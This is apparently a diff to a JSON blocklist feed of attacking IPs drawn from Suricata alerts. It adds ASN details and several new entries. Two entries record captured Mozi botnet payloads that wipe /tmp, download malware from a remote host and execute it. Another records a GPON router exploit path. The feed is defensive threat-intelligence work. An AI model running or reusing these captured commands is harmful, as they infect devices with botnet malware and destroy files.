@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-09T01:00:00Z",
+  "generated_at": "2026-10-09T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 1254,
-    "v4": 1254,
+    "total": 1259,
+    "v4": 1259,
     "v6": 0
   },
   "items": [
@@ -20514,6 +20514,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -20556,6 +20559,96 @@
       "asn": "14061",
       "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
       "asn_prefix": "24.199.96.0/20",
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "72.255.33.193",
+      "family": "v4",
+      "first_seen": "2026-10-09T08:00:00Z",
+      "last_seen": "2026-10-09T08:00:00Z",
+      "scenarios": [
+        "suricata/ET EXPLOIT HackingTrio UA (Hello, World)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "72.255.33.0/24",
+      "payloads": [
+        "POST /GponForm/diag_Form?images/"
+      ]
+    },
+    {
+      "ip": "202.63.202.23",
+      "family": "v4",
+      "first_seen": "2026-10-09T06:00:00Z",
+      "last_seen": "2026-10-09T06:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "141342",
+      "asn_name": "FIBERISHPVTLTD-AS-AP - FIBERISH (PVT) LTD",
+      "asn_prefix": "202.63.202.0/24",
+      "payloads": [
+        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://202.63.202.23:45912/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
+      ]
+    },
+    {
+      "ip": "103.72.87.9",
+      "family": "v4",
+      "first_seen": "2026-10-09T05:00:00Z",
+      "last_seen": "2026-10-09T05:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "153844",
+      "asn_name": "RNBL-AS-AP - Riderz Network Broadband (Private) Limited",
+      "asn_prefix": "103.72.87.0/24",
+      "payloads": [
+        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
+      ]
+    },
+    {
+      "ip": "152.32.128.214",
+      "family": "v4",
+      "first_seen": "2026-10-09T01:00:00Z",
+      "last_seen": "2026-10-09T01:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA TLS invalid SNI length"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "152.32.128.0/24"
+    },
+    {
+      "ip": "52.188.225.226",
+      "family": "v4",
+      "first_seen": "2026-10-09T11:00:00Z",
+      "last_seen": "2026-10-09T11:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "52.160.0.0/11",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
       "payloads": [
         "GET /"
       ]
